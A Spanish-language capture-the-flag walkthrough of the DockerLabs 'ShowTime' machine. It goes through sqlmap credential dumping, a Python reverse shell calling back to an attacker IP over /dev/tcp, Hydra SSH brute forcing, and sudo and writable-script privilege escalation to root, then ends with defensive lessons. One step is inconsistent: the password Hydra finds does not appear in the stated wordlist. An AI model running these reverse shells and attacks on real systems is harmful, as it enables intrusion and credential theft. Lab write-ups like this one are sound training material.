# ShowTime — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** maciiii__  
**Fecha de creación:** 24/07/2024  
**Técnicas:** Burp Suite · SQLMap · SQL Injection · Reverse Shell · Hydra · sudo posh abuse · Writable script

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web y Burp Suite](#2-enumeración-web-y-burp-suite)
3. [SQL Injection con SQLMap](#3-sql-injection-con-sqlmap)
4. [Panel Python — Reverse Shell](#4-panel-python--reverse-shell)
5. [Fuerza bruta SSH — Hydra](#5-fuerza-bruta-ssh--hydra)
6. [Escalada de privilegios — usuario luciano](#6-escalada-de-privilegios--usuario-luciano)
7. [Escalada final a root](#7-escalada-final-a-root)
8. [Lección aprendida](#8-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh showtime.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Enumeración web y Burp Suite

Accedemos al servidor web y encontramos un panel de login.

Intentamos SQL Injection manualmente sin éxito.

Configuramos Burp Suite:

- Proxy activo en `127.0.0.1:8080`
- Intercept activado
- FoxyProxy configurado en el navegador

Interceptamos la petición POST:

```http
POST /login_page/auth.php HTTP/1.1
```

Contenido enviado:

```text
usuario=admin&contraseña=admin
```

Guardamos la request:

```text
req.req
```

---

## 3. SQL Injection con SQLMap

Enumeramos bases de datos:

```bash
sqlmap -r req.req --batch --dbs
```

Resultado:

```text
information_schema
mysql
performance_schema
sys
users
```

Enumeramos tablas:

```bash
sqlmap -r req.req --batch -D users --tables
```

Resultado:

```text
usuarios
```

Enumeramos columnas:

```bash
sqlmap -r req.req --batch -D users -T usuarios --columns
```

Columnas encontradas:

```text
id
password
username
```

Extraemos usuarios y contraseñas:

```bash
sqlmap -r req.req --batch -D users -T usuarios --dump
```

Resultado:

```text
lucas     : 123321123321
santiago  : 123456123456
joe       : MiClaveEsInhackeable
```

Probamos las credenciales y accedemos con:

```text
Usuario: joe
Contraseña: MiClaveEsInhackeable
```

El usuario tiene acceso a un panel que ejecuta código Python.

---

## 4. Panel Python — Reverse Shell

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell desde el panel Python:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'")
```

Obtenemos acceso remoto:

```bash
whoami
www-data
```

Exploramos `/tmp`:

```bash
cd /tmp
ls -la
```

Encontramos:

```text
.hidden_text.txt
```

Contenido:

```text
HESOYAM
UZUMYMW
JUMPJET
LXGIWYL
KJKSZPJ
```

Parecen posibles contraseñas.

Listamos usuarios:

```bash
cd /home
ls -la
```

Usuarios encontrados:

```text
joe
luciano
ubuntu
```

Convertimos las palabras a minúsculas:

```bash
awk '{print tolower($0)}' passwords.txt > contra.txt
```

---

## 5. Fuerza bruta SSH — Hydra

Realizamos fuerza bruta:

```bash
hydra -L users.txt -P contra.txt ssh://172.17.0.2
```

Resultado:

```text
login: joe
password: chittychittybangbang
```

Accedemos:

```bash
ssh joe@172.17.0.2
```

---

## 6. Escalada de privilegios — usuario luciano

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(luciano) NOPASSWD: /bin/posh
```

Consultamos GTFOBins y ejecutamos:

```bash
sudo -u luciano /bin/posh
```

Verificamos usuario:

```bash
whoami
luciano
```

Comprobamos nuevamente privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /bin/bash /home/luciano/script.sh
```

Leemos el script:

```bash
cat /home/luciano/script.sh
```

Contenido:

```bash
#!/bin/bash

IP="192.168.1.100"
PORT="4444"

bash -c 'exec 5<>/dev/tcp/$IP/$PORT; cat <&5 | bash >&5 2>&5'
```

---

## 7. Escalada final a root

Modificamos el script directamente desde consola:

```bash
echo '/bin/bash' > /home/luciano/script.sh
```

Ejecutamos como root:

```bash
sudo /bin/bash /home/luciano/script.sh
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 8. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| SQL Injection | Extracción de credenciales |
| Ejecución arbitraria de Python | Reverse Shell |
| Contraseñas débiles/reutilizadas | Acceso SSH |
| sudo sobre posh | Escalada horizontal |
| Script escribible ejecutado como root | Escalada final |

**Para defenderse:**

- Validar correctamente entradas SQL.
- Restringir ejecución de código arbitrario.
- Aplicar políticas robustas de contraseñas.
- Limitar permisos sudo innecesarios.
- Proteger scripts ejecutados con privilegios elevados.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
